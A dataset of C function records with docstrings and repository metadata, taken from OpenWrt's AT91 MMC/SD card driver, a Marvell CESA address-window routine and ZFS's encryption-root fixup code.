{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_MMC_GetAllCID\n//* \\brief Asks to the MMC on the chosen slot to send its CID\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_MMC_GetAllCID (AT91PS_MciDevice pMCI_Device, unsigned int *response)", "code": "{\n\tint Nb_Cards_Found=-1;\n  \n\twhile(1)\n\t{\n\t \tif(AT91F_MCI_SendCommand(pMCI_Device,\n\t\t\t\t\t\t\t\tAT91C_MMC_ALL_SEND_CID_CMD,\n\t\t\t\t\t\t\t\tAT91C_NO_ARGUMENT) != AT91C_CMD_SEND_OK)\n\t\t\treturn Nb_Cards_Found;\n\t\telse\n\t\t{\t\t\n\t\t\tNb_Cards_Found = 0;\n\t\t\t//* Assignation of the relative address to the MMC CARD\n\t\t\tpMCI_Device->pMCI_DeviceFeatures[Nb_Cards_Found].Relative_Card_Address = Nb_Cards_Found + AT91C_FIRST_RCA;\n\t\t\t//* Set the insert flag\n\t\t\tpMCI_Device->pMCI_DeviceFeatures[Nb_Cards_Found].Card_Inserted = AT91C_MMC_CARD_INSERTED;\n\t\n\t\t\tif (AT91F_MCI_SendCommand(pMCI_Device,\n\t\t\t\t\t\t\t\t\t AT91C_MMC_SET_RELATIVE_ADDR_CMD,\n\t\t\t\t\t\t\t\t\t (Nb_Cards_Found + AT91C_FIRST_RCA) << 16) != AT91C_CMD_SEND_OK)\n\t\t\t\treturn AT91C_CMD_SEND_ERROR;\n\t\t\t\t \n\t\t\t//* If no error during assignation address ==> Increment Nb_cards_Found\n\t\t\tNb_Cards_Found++ ;\n\t\t}\n\t}\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SDCard_SendAppCommand\n//* \\brief Specific function to send a specific command to the SDCard\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SDCard_SendAppCommand (\n\tAT91PS_MciDevice pMCI_Device,\n\tunsigned int Cmd_App,\n\tunsigned int Arg\t)", "code": "{\n\tunsigned int status;\n\t//unsigned int\ttick=0;\n\n\t// Send the CMD55 for application specific command\n    AT91C_BASE_MCI->MCI_ARGR = (pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address << 16 );\n    AT91C_BASE_MCI->MCI_CMDR = AT91C_APP_CMD;\n\n\t// wait for CMDRDY Status flag to read the response\n\tdo\n\t{\n\t\tstatus = AT91C_BASE_MCI->MCI_SR;\n\t\t//tick++;\n\t}\n\twhile( !(status & AT91C_MCI_CMDRDY) );//&& (tick<100) );\t\n\n    // if an error occurs\n    if (((AT91C_BASE_MCI->MCI_SR) & AT91C_MCI_SR_ERROR) != 0 )\n\t\treturn ((AT91C_BASE_MCI->MCI_SR) & AT91C_MCI_SR_ERROR);\n\n    // check if it is a specific command and then send the command\n\tif ( (Cmd_App && AT91C_SDCARD_APP_ALL_CMD) == 0)\n\t\treturn AT91C_CMD_SEND_ERROR;\n\n   return( AT91F_MCI_SendCommand(pMCI_Device,Cmd_App,Arg) );\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*--------------------------------------------------------------------\n//* \\fn    AT91F_MCI_ReadBlockSwab\n//* \\brief Read Block and swap byte order\n//*--------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_ReadBlockSwab(\n\tAT91PS_MciDevice pMCI_Device,\n\tint src,\n\tunsigned int *databuffer,\n\tint sizeToRead)", "code": "{\n\tint i;\n\tunsigned char *buf = (unsigned char *)databuffer;\n\n\t//* Read Block 1\n\tfor(i=0;i<BUFFER_SIZE_MCI_DEVICE;i++)\n\t\t*buf++ = 0x00;\t\n\tAT91F_MCI_ReadBlock(&MCI_Device,src,databuffer,sizeToRead);\n\n\t//* Wait end of Read\n\tAT91F_MCIDeviceWaitReady(AT91C_MCI_TIMEOUT);\n\n\t{\n\t\tint index;\n\t\tunsigned int *uiBuffer = databuffer;\n\n\t\tfor(index = 0; index < 512/4; index++)\n\t\t\tuiBuffer[index] = swab32(uiBuffer[index]);\n\t}\n\treturn(1);\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_WriteBlock\n//* \\brief  Write an ENTIRE block but not always PARTIAL block !!!\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_WriteBlock(\n\tAT91PS_MciDevice pMCI_Device,\n\tint dest,\n\tunsigned int *dataBuffer,\n\tint sizeToWrite )", "code": "{\n    ////////////////////////////////////////////////////////////////////////////////////////////\n\tif( pMCI_Device->pMCI_DeviceDesc->state != AT91C_MCI_IDLE)\n    \treturn AT91C_WRITE_ERROR;\n    \n    if( (AT91F_MCI_GetStatus(pMCI_Device,pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address) & AT91C_SR_READY_FOR_DATA) != AT91C_SR_READY_FOR_DATA)\n    \treturn AT91C_WRITE_ERROR;\n    \t\n    if ( (dest + sizeToWrite) > pMCI_Device->pMCI_DeviceFeatures->Memory_Capacity )\n\t\treturn AT91C_WRITE_ERROR;\n\n    // If source does not fit a begin of a block\n\tif ( (dest % pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length) != 0 )\n\t\treturn AT91C_WRITE_ERROR;\n   \n    // Test if the MMC supports Partial Write Block \n    if( (sizeToWrite < pMCI_Device->pMCI_DeviceFeatures->Max_Write_DataBlock_Length) \n    \t&& (pMCI_Device->pMCI_DeviceFeatures->Write_Partial == 0x00) )\n   \t\treturn AT91C_WRITE_ERROR;\n   \t\t\n   \tif( sizeToWrite > pMCI_Device->pMCI_DeviceFeatures->Max_Write_DataBlock_Length )\n   \t\treturn AT91C_WRITE_ERROR;\n    ////////////////////////////////////////////////////////////////////////////////////////////\n  \n    // Init Mode Register\n\tAT91C_BASE_MCI->MCI_MR |= ((pMCI_Device->pMCI_DeviceFeatures->Max_Write_DataBlock_Length << 16) | AT91C_MCI_PDCMODE);\n\t\n\tif (sizeToWrite %4)\n\t\tsizeToWrite = (sizeToWrite /4)+1;\n\telse\n\t\tsizeToWrite = sizeToWrite/4;\n\n\t// Init PDC for write sequence\n    AT91C_BASE_PDC_MCI->PDC_PTCR = (AT91C_PDC_TXTDIS | AT91C_PDC_RXTDIS);\n    AT91C_BASE_PDC_MCI->PDC_TPR = (unsigned int) dataBuffer;\n    AT91C_BASE_PDC_MCI->PDC_TCR = sizeToWrite;\n\n\t// Send the write single block command\n    if ( AT91F_MCI_SendCommand(pMCI_Device, AT91C_WRITE_BLOCK_CMD, dest) != AT91C_CMD_SEND_OK)\n    \treturn AT91C_WRITE_ERROR;\n\n\tpMCI_Device->pMCI_DeviceDesc->state = AT91C_MCI_TX_SINGLE_BLOCK;\n\n\t// Enable AT91C_MCI_TXBUFE Interrupt\n    AT91C_BASE_MCI->MCI_IER = AT91C_MCI_TXBUFE;\n  \n  \t// Enables TX for PDC transfert requests\n    AT91C_BASE_PDC_MCI->PDC_PTCR = AT91C_PDC_TXTEN;\n  \n\treturn AT91C_WRITE_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_ReadBlock\n//* \\brief Read an ENTIRE block or PARTIAL block\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_ReadBlock(\n\tAT91PS_MciDevice pMCI_Device,\n\tint src,\n\tunsigned int *dataBuffer,\n\tint sizeToRead )", "code": "{\n    ////////////////////////////////////////////////////////////////////////////////////////////\n    if(pMCI_Device->pMCI_DeviceDesc->state != AT91C_MCI_IDLE)\n    \treturn AT91C_READ_ERROR;\n    \n    if( (AT91F_MCI_GetStatus(pMCI_Device,pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address) & AT91C_SR_READY_FOR_DATA) != AT91C_SR_READY_FOR_DATA)\n    \treturn AT91C_READ_ERROR;\n    \t\n    if ( (src + sizeToRead) > pMCI_Device->pMCI_DeviceFeatures->Memory_Capacity )\n\t\treturn AT91C_READ_ERROR;\n\n    // If source does not fit a begin of a block\n\tif ( (src % pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length) != 0 )\n\t\treturn AT91C_READ_ERROR;\n   \n     // Test if the MMC supports Partial Read Block\n     // ALWAYS SUPPORTED IN SD Memory Card\n     if( (sizeToRead < pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length) \n    \t&& (pMCI_Device->pMCI_DeviceFeatures->Read_Partial == 0x00) )\n   \t\treturn AT91C_READ_ERROR;\n   \t\t\n    if( sizeToRead > pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length)\n   \t\treturn AT91C_READ_ERROR;\n    ////////////////////////////////////////////////////////////////////////////////////////////\n      \n    // Init Mode Register\n\tAT91C_BASE_MCI->MCI_MR |= ((pMCI_Device->pMCI_DeviceFeatures->Max_Read_DataBlock_Length << 16) | AT91C_MCI_PDCMODE);\n\t \n    if (sizeToRead %4)\n\t\tsizeToRead = (sizeToRead /4)+1;\n\telse\n\t\tsizeToRead = sizeToRead/4;\n\n\tAT91C_BASE_PDC_MCI->PDC_PTCR = (AT91C_PDC_TXTDIS | AT91C_PDC_RXTDIS);\n    AT91C_BASE_PDC_MCI->PDC_RPR  = (unsigned int)dataBuffer;\n    AT91C_BASE_PDC_MCI->PDC_RCR  = sizeToRead;\n\n\t// Send the Read single block command\n    if ( AT91F_MCI_SendCommand(pMCI_Device, AT91C_READ_SINGLE_BLOCK_CMD, src) != AT91C_CMD_SEND_OK )\n    \treturn AT91C_READ_ERROR;\n\n\tpMCI_Device->pMCI_DeviceDesc->state = AT91C_MCI_RX_SINGLE_BLOCK;\n\n\t// Enable AT91C_MCI_RXBUFF Interrupt\n    AT91C_BASE_MCI->MCI_IER = AT91C_MCI_RXBUFF;\n\n\t// (PDC) Receiver Transfer Enable\n\tAT91C_BASE_PDC_MCI->PDC_PTCR = AT91C_PDC_RXTEN;\n\t\n\treturn AT91C_READ_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCIDeviceWaitReady\n//* \\brief Wait for MCI Device ready\n//*----------------------------------------------------------------------------\n", "func_signal": "void AT91F_MCIDeviceWaitReady(unsigned int timeout)", "code": "{\n\tvolatile int status;\n\t\n\tdo\n\t{\n\t\tstatus = AT91C_BASE_MCI->MCI_SR;\n\t\ttimeout--;\n\t}\n\twhile( !(status & AT91C_MCI_NOTBUSY)  && (timeout>0) );\t\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_MMC_Init\n//* \\brief Return the MMC initialisation status\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_MMC_Init (AT91PS_MciDevice pMCI_Device)", "code": "{\n    unsigned int\ttab_response[4];\n\tunsigned int\tmult,blocknr;\n\tunsigned int \ti,Nb_Cards_Found=0;\n\n\t//* Resets all MMC Cards in Idle state\n\tAT91F_MCI_SendCommand(pMCI_Device, AT91C_MMC_GO_IDLE_STATE_CMD, AT91C_NO_ARGUMENT);\n\n    if(AT91F_MCI_MMC_GetAllOCR(pMCI_Device) == AT91C_INIT_ERROR)\n    \treturn AT91C_INIT_ERROR;\n\n\tNb_Cards_Found = AT91F_MCI_MMC_GetAllCID(pMCI_Device,tab_response);\n\tif (Nb_Cards_Found != AT91C_CMD_SEND_ERROR)\n\t{\n\t    //* Set the Mode Register\n    \tAT91C_BASE_MCI->MCI_MR = AT91C_MCI_MR_PDCMODE;\n\n\t\tfor(i = 0; i < Nb_Cards_Found; i++)\n\t\t{\n\t\t\tif (AT91F_MCI_GetCSD(pMCI_Device,\n\t\t\t\t\t\t\t\t\t  pMCI_Device->pMCI_DeviceFeatures[i].Relative_Card_Address,\n\t\t\t\t\t\t\t\t\t  tab_response) != AT91C_CMD_SEND_OK)\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Relative_Card_Address = 0;\t\t\t\t\t  \n\t\t\telse\n\t\t\t{\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Max_Read_DataBlock_Length = 1 << ((tab_response[1] >> AT91C_CSD_RD_B_LEN_S) & AT91C_CSD_RD_B_LEN_M );\n\t \t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Max_Write_DataBlock_Length =\t1 << ((tab_response[3] >> AT91C_CSD_WBLEN_S) & AT91C_CSD_WBLEN_M );\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Sector_Size = 1 + ((tab_response[2] >> AT91C_CSD_v22_SECT_SIZE_S) & AT91C_CSD_v22_SECT_SIZE_M );\n\t\t  \t\tpMCI_Device->pMCI_DeviceFeatures[i].Read_Partial = (tab_response[1] >> AT91C_CSD_RD_B_PAR_S) & AT91C_CSD_RD_B_PAR_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Write_Partial = (tab_response[3] >> AT91C_CSD_WBLOCK_P_S) & AT91C_CSD_WBLOCK_P_M;\n\t\t\t\t\n\t\t\t\t// None in MMC specification version 2.2\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Erase_Block_Enable = 0;\n\t\t\t\t\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Read_Block_Misalignment = (tab_response[1] >> AT91C_CSD_RD_B_MIS_S) & AT91C_CSD_RD_B_MIS_M;\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Write_Block_Misalignment = (tab_response[1] >> AT91C_CSD_WR_B_MIS_S) & AT91C_CSD_WR_B_MIS_M;\n\n\t\t\t\t//// Compute Memory Capacity\n\t\t\t\t// compute MULT\n\t\t\t\tmult = 1 << ( ((tab_response[2] >> AT91C_CSD_C_SIZE_M_S) & AT91C_CSD_C_SIZE_M_M) + 2 );\n\t\t\t\t// compute MSB of C_SIZE\n\t\t\t\tblocknr = ((tab_response[1] >> AT91C_CSD_CSIZE_H_S) & AT91C_CSD_CSIZE_H_M) << 2;\n\t\t\t\t// compute MULT * (LSB of C-SIZE + MSB already computed + 1) = BLOCKNR\n\t\t\t\tblocknr = mult * ( ( blocknr + ( (tab_response[2] >> AT91C_CSD_CSIZE_L_S) & AT91C_CSD_CSIZE_L_M) ) + 1 );\n\n\t\t\t\tpMCI_Device->pMCI_DeviceFeatures[i].Memory_Capacity =  pMCI_Device->pMCI_DeviceFeatures[i].Max_Read_DataBlock_Length * blocknr;\n\t\t  \t\t//// End of Compute Memory Capacity\n\t\t  \t\t\n\t\t\t}\t// end of else\t\t\t  \n\t\t}\t// end of for\n\t\t\n\t\treturn AT91C_INIT_OK;\n\t}\t// end of if\n\n    return AT91C_INIT_ERROR;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_Device_Handler\n//* \\brief MCI C interrupt handler\n//*----------------------------------------------------------------------------\n", "func_signal": "void AT91F_MCI_Device_Handler(\n\tAT91PS_MciDevice pMCI_Device,\n\tunsigned int status)", "code": "{\n\t// If End of Tx Buffer Empty interrupt occurred\n\tif ( status & AT91C_MCI_TXBUFE )\n    {\n\t\tAT91C_BASE_MCI->MCI_IDR = AT91C_MCI_TXBUFE;\n \t\tAT91C_BASE_PDC_MCI->PDC_PTCR = AT91C_PDC_TXTDIS;\n        \t\n\t\tpMCI_Device->pMCI_DeviceDesc->state = AT91C_MCI_IDLE;\n\t}\t// End of if AT91C_MCI_TXBUFF\t\t\n\t\n    // If End of Rx Buffer Full interrupt occurred\n    if ( status & AT91C_MCI_RXBUFF )\n    {        \n       \tAT91C_BASE_MCI->MCI_IDR = AT91C_MCI_RXBUFF;\n \t\tAT91C_BASE_PDC_MCI->PDC_PTCR = AT91C_PDC_RXTDIS;\n\t\n\t\tpMCI_Device->pMCI_DeviceDesc->state = AT91C_MCI_IDLE;\n\t}\t// End of if AT91C_MCI_RXBUFF\n\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SDCard_SetBusWidth\n//* \\brief  Set bus width for SDCard\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SDCard_SetBusWidth(AT91PS_MciDevice pMCI_Device)", "code": "{\n\tvolatile int\tret_value;\n\tchar\t\t\tbus_width;\n\n\tdo\n\t{\n\t\tret_value =AT91F_MCI_GetStatus(pMCI_Device,pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address);\n\t}\n\twhile((ret_value > 0) && ((ret_value & AT91C_SR_READY_FOR_DATA) == 0));\n\n\t// Select Card\n    AT91F_MCI_SendCommand(pMCI_Device,\n    \t\t\t\t\t\tAT91C_SEL_DESEL_CARD_CMD,\n    \t\t\t\t\t\t(pMCI_Device->pMCI_DeviceFeatures->Relative_Card_Address)<<16);\n\n\t// Set bus width for Sdcard\n\tif(pMCI_Device->pMCI_DeviceDesc->SDCard_bus_width == AT91C_MCI_SCDBUS)\n\t\t \tbus_width = AT91C_BUS_WIDTH_4BITS;\n\telse\tbus_width = AT91C_BUS_WIDTH_1BIT;\n\n\tif (AT91F_MCI_SDCard_SendAppCommand(pMCI_Device,AT91C_SDCARD_SET_BUS_WIDTH_CMD,bus_width) != AT91C_CMD_SEND_OK)\n\t\treturn AT91C_CMD_SEND_ERROR;\n\n\treturn AT91C_CMD_SEND_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_SDCard_GetCID\n//* \\brief Asks to the SDCard on the chosen slot to send its CID\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_SDCard_GetCID (AT91PS_MciDevice pMCI_Device, unsigned int *response)", "code": "{\n \tif(AT91F_MCI_SendCommand(pMCI_Device,\n\t\t\t\t\t\t\tAT91C_ALL_SEND_CID_CMD,\n\t\t\t\t\t\t\tAT91C_NO_ARGUMENT) != AT91C_CMD_SEND_OK)\n\t\treturn AT91C_CMD_SEND_ERROR;\n\t\n    response[0] = AT91C_BASE_MCI->MCI_RSPR[0];\n   \tresponse[1] = AT91C_BASE_MCI->MCI_RSPR[1];\n    response[2] = AT91C_BASE_MCI->MCI_RSPR[2];\n    response[3] = AT91C_BASE_MCI->MCI_RSPR[3];\n    \n    return AT91C_CMD_SEND_OK;\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "/*******************************************************************************\n* mvCesaWinGet - Get TDMA target address window.\n*\n* DESCRIPTION:\n*       Get TDMA target address window.\n*\n* INPUT:\n*       winNum - TDMA target address decode window number.\n*\n* OUTPUT:\n*       pDecWin - TDMA target window data structure.\n*\n* RETURN:\n*       MV_ERROR if register parameters are invalid.\n*\n*******************************************************************************/\n", "func_signal": "static MV_STATUS mvCesaWinGet(MV_U32 winNum, MV_DEC_WIN *pDecWin)", "code": "{                                                                                                                         \n    MV_DEC_WIN_PARAMS   winParam;\n    MV_U32              sizeReg, baseReg;\n\n    /* Parameter checking   */\n    if (winNum >= MV_CESA_TDMA_ADDR_DEC_WIN)\n    {\n        mvOsPrintf(\"%s : ERR. Invalid winNum %d\\n\", \n                    __FUNCTION__, winNum);\n        return MV_NOT_SUPPORTED;\n    }\n\n    baseReg = MV_REG_READ( MV_CESA_TDMA_BASE_ADDR_REG(winNum) );\n    sizeReg = MV_REG_READ( MV_CESA_TDMA_WIN_CTRL_REG(winNum) );\n \n   /* Check if window is enabled   */\n    if(sizeReg & MV_CESA_TDMA_WIN_ENABLE_MASK) \n    {\n        pDecWin->enable = MV_TRUE;\n\n        /* Extract window parameters from registers */\n        winParam.targetId = (sizeReg & MV_CESA_TDMA_WIN_TARGET_MASK) >> MV_CESA_TDMA_WIN_TARGET_OFFSET; \n        winParam.attrib   = (sizeReg & MV_CESA_TDMA_WIN_ATTR_MASK) >> MV_CESA_TDMA_WIN_ATTR_OFFSET;\n        winParam.size     = (sizeReg & MV_CESA_TDMA_WIN_SIZE_MASK) >> MV_CESA_TDMA_WIN_SIZE_OFFSET;\n        winParam.baseAddr = (baseReg & MV_CESA_TDMA_WIN_BASE_MASK);\n\n        /* Translate the decode window parameters to address decode struct */\n        if (MV_OK != mvCtrlParamsToAddrDec(&winParam, pDecWin))\n        {\n            mvOsPrintf(\"Failed to translate register parameters to CESA address\" \\\n                       \" decode window structure\\n\");\n            return MV_ERROR;        \n        }\n    }\n    else\n    {\n        pDecWin->enable = MV_FALSE;\n    }\n    return MV_OK;\n}", "path": "openwrt/target/linux/generic/files/crypto/ocf/kirkwood/mvHal/kw_family/ctrlEnv/sys/mvSysCesa.c", "commit_date": "2010-06-26 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "//*----------------------------------------------------------------------------\n//* \\fn    AT91F_MCI_MMC_GetAllOCR\n//* \\brief Asks to all cards to send their operations conditions\n//*----------------------------------------------------------------------------\n", "func_signal": "int AT91F_MCI_MMC_GetAllOCR (AT91PS_MciDevice pMCI_Device)", "code": "{\n\tunsigned int\tresponse =0x0;\n \t\n \twhile(1)\n    {\n    \tresponse = AT91F_MCI_SendCommand(pMCI_Device,\n  \t\t\t\t\t\t\t\t\t\tAT91C_MMC_SEND_OP_COND_CMD,\n  \t\t\t\t\t\t\t\t\t\tAT91C_MMC_HOST_VOLTAGE_RANGE);\n\t\tif (response != AT91C_CMD_SEND_OK)\n\t\t\treturn AT91C_INIT_ERROR;\n\t\t\n\t\tresponse = AT91C_BASE_MCI->MCI_RSPR[0];\n\t\t\n\t\tif ( (response & AT91C_CARD_POWER_UP_BUSY) == AT91C_CARD_POWER_UP_BUSY)\n\t\t\treturn(response);\t\n\t}\n}", "path": "openwrt/target/linux/at91/image/dfboot/src/mci_device.c", "commit_date": "2007-09-06 00:00:00", "repo_name": "openwrt-mirror/openwrt", "stars": 526, "license": "gpl-2.0", "language": "c", "size": 158766}
{"docstring": "/*\n * This function reestablishes the hierarchy of encryption roots after a\n * recursive incremental receive has completed. This must be done after the\n * second call to recv_incremental_replication() has renamed and promoted all\n * sent datasets to their final locations in the dataset hierarchy.\n */\n", "func_signal": "static int\nrecv_fix_encryption_hierarchy(libzfs_handle_t *hdl, const char *destname,\n    nvlist_t *stream_nv, avl_tree_t *stream_avl)", "code": "{\n\tint err;\n\tnvpair_t *fselem = NULL;\n\tnvlist_t *stream_fss;\n\tchar *cp;\n\tchar top_zfs[ZFS_MAX_DATASET_NAME_LEN];\n\n\t(void) strcpy(top_zfs, destname);\n\tcp = strrchr(top_zfs, '@');\n\tif (cp != NULL)\n\t\t*cp = '\\0';\n\n\tVERIFY(0 == nvlist_lookup_nvlist(stream_nv, \"fss\", &stream_fss));\n\n\twhile ((fselem = nvlist_next_nvpair(stream_fss, fselem)) != NULL) {\n\t\tzfs_handle_t *zhp = NULL;\n\t\tuint64_t crypt;\n\t\tnvlist_t *snaps, *props, *stream_nvfs = NULL;\n\t\tnvpair_t *snapel = NULL;\n\t\tboolean_t is_encroot, is_clone, stream_encroot;\n\t\tchar *cp;\n\t\tchar *stream_keylocation = NULL;\n\t\tchar keylocation[MAXNAMELEN];\n\t\tchar fsname[ZFS_MAX_DATASET_NAME_LEN];\n\n\t\tkeylocation[0] = '\\0';\n\t\tVERIFY(0 == nvpair_value_nvlist(fselem, &stream_nvfs));\n\t\tVERIFY(0 == nvlist_lookup_nvlist(stream_nvfs, \"snaps\", &snaps));\n\t\tVERIFY(0 == nvlist_lookup_nvlist(stream_nvfs, \"props\", &props));\n\t\tstream_encroot = nvlist_exists(stream_nvfs, \"is_encroot\");\n\n\t\t/* find a snapshot from the stream that exists locally */\n\t\terr = ENOENT;\n\t\twhile ((snapel = nvlist_next_nvpair(snaps, snapel)) != NULL) {\n\t\t\tuint64_t guid;\n\n\t\t\tVERIFY(0 == nvpair_value_uint64(snapel, &guid));\n\t\t\terr = guid_to_name(hdl, destname, guid, B_FALSE,\n\t\t\t    fsname);\n\t\t\tif (err == 0)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tif (err != 0)\n\t\t\tcontinue;\n\n\t\tcp = strchr(fsname, '@');\n\t\tif (cp != NULL)\n\t\t\t*cp = '\\0';\n\n\t\tzhp = zfs_open(hdl, fsname, ZFS_TYPE_DATASET);\n\t\tif (zhp == NULL) {\n\t\t\terr = ENOENT;\n\t\t\tgoto error;\n\t\t}\n\n\t\tcrypt = zfs_prop_get_int(zhp, ZFS_PROP_ENCRYPTION);\n\t\tis_clone = zhp->zfs_dmustats.dds_origin[0] != '\\0';\n\t\t(void) zfs_crypto_get_encryption_root(zhp, &is_encroot, NULL);\n\n\t\t/* we don't need to do anything for unencrypted filesystems */\n\t\tif (crypt == ZIO_CRYPT_OFF) {\n\t\t\tzfs_close(zhp);\n\t\t\tcontinue;\n\t\t}\n\n\t\t/*\n\t\t * If the dataset is flagged as an encryption root, was not\n\t\t * received as a clone and is not currently an encryption root,\n\t\t * force it to become one. Fixup the keylocation if necessary.\n\t\t */\n\t\tif (stream_encroot) {\n\t\t\tif (!is_clone && !is_encroot) {\n\t\t\t\terr = lzc_change_key(fsname,\n\t\t\t\t    DCP_CMD_FORCE_NEW_KEY, NULL, NULL, 0);\n\t\t\t\tif (err != 0) {\n\t\t\t\t\tzfs_close(zhp);\n\t\t\t\t\tgoto error;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tVERIFY(0 == nvlist_lookup_string(props,\n\t\t\t    zfs_prop_to_name(ZFS_PROP_KEYLOCATION),\n\t\t\t    &stream_keylocation));\n\n\t\t\t/*\n\t\t\t * Refresh the properties in case the call to\n\t\t\t * lzc_change_key() changed the value.\n\t\t\t */\n\t\t\tzfs_refresh_properties(zhp);\n\t\t\terr = zfs_prop_get(zhp, ZFS_PROP_KEYLOCATION,\n\t\t\t    keylocation, sizeof (keylocation), NULL, NULL,\n\t\t\t    0, B_TRUE);\n\t\t\tif (err != 0) {\n\t\t\t\tzfs_close(zhp);\n\t\t\t\tgoto error;\n\t\t\t}\n\n\t\t\tif (strcmp(keylocation, stream_keylocation) != 0) {\n\t\t\t\terr = zfs_prop_set(zhp,\n\t\t\t\t    zfs_prop_to_name(ZFS_PROP_KEYLOCATION),\n\t\t\t\t    stream_keylocation);\n\t\t\t\tif (err != 0) {\n\t\t\t\t\tzfs_close(zhp);\n\t\t\t\t\tgoto error;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * If the dataset is not flagged as an encryption root and is\n\t\t * currently an encryption root, force it to inherit from its\n\t\t * parent. The root of a raw send should never be\n\t\t * force-inherited.\n\t\t */\n\t\tif (!stream_encroot && is_encroot &&\n\t\t    strcmp(top_zfs, fsname) != 0) {\n\t\t\terr = lzc_change_key(fsname, DCP_CMD_FORCE_INHERIT,\n\t\t\t    NULL, NULL, 0);\n\t\t\tif (err != 0) {\n\t\t\t\tzfs_close(zhp);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t}\n\n\t\tzfs_close(zhp);\n\t}\n\n\treturn (0);\n\nerror:\n\treturn (err);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
